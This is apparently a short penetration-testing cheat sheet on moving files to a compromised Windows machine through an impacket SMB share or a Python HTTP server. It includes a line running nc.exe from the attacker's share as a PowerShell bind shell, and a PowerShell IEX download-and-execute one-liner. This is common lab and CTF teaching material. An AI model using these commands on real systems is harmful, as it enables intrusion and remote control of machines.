SMB Server

Go Index

One popular technique to transfer files between computers is using smb or samba shares.

Opening an SMB server

Just go the desired place (as if we were going to open an HTTP server) and run the following command.

impacket-smbserver folder .

This command will open an smb share called folder and would point to our current system location (thus .)

Transferring files from the SMB server

To copy a file from the remote host to our host, for example an nc.exe file.

copy \\10.10.14.13\folder\nc.exe nc.exe

This command will copy nc.exe and transfer it into our machine as nc.exe.

Execute files from the SMB server

It is possible to execute a file from a SMB server location by pointing to it.

For example, if we want to run a bind shell:

\\10.10.14.13\folder\nc.exe -lvnp 443 -e powershell.exe

This can be specially handy if the machine is write-restrictive.

Web Server

Go Index

One popular technique to transfer files between computers is opnening a web server inside our host machine and curl, wget or via powershell download the files.

Opening an Web Server

There are multiple ways to open a web server inside our host machine, but the fastest one is the following:

  1. Go to the desired folder where the files to send are placed.
  2. Run sudo python -m http.server

This will open a web server hosting every single file in the current directory.

The default port is 8000

Downloading files from the Web Server

Again, there are multiple ways to download files from a web server.

Most known are:

  • curl http://10.10.14.2:8000/file.txt -o file.txt (saves file)
  • wget http://10.10.14.2:8000/file.txt
  • Windows PS: IEX(New-Object Net.WebClient).downloadString("http://10.10.14.2:8000/file.txt")
